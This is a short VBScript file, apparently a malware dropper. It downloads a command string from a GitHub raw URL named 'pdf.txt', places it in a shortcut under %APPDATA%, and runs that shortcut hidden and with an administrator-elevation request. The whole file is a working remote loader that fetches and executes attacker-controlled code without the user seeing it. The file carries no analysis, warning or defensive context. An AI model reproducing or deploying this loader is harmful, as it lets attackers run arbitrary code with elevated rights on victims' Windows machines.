Set WshShell = WScript.CreateObject("WScript.Shell")
Set Http = CreateObject("MSXML2.XMLHTTP")
Http.Open "GET", "https://raw.githubusercontent.com/hrgdgjdh-dotcom/xs/refs/heads/main/pdf.txt", False
Http.Send
If Http.Status = 200 Then
    FullCommand = Http.ResponseText
Else
    WScript.Quit
End If

Parts = Split(FullCommand, " ", 2)

If UBound(Parts) >= 1 Then
    TargetExe = Parts(0)
    CommandArgs = Parts(1)
Else
    WScript.Quit
End If

AppDataPath = WshShell.ExpandEnvironmentStrings("%APPDATA%")
ShortcutPath = AppDataPath & "\Download.lnk"
Set Shortcut = WshShell.CreateShortcut(ShortcutPath)

Shortcut.TargetPath = TargetExe
Shortcut.Arguments = CommandArgs
Shortcut.WorkingDirectory = AppDataPath
Shortcut.IconLocation = TargetExe & ",0"

Shortcut.Save

Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute ShortcutPath, "", "", "runas", 0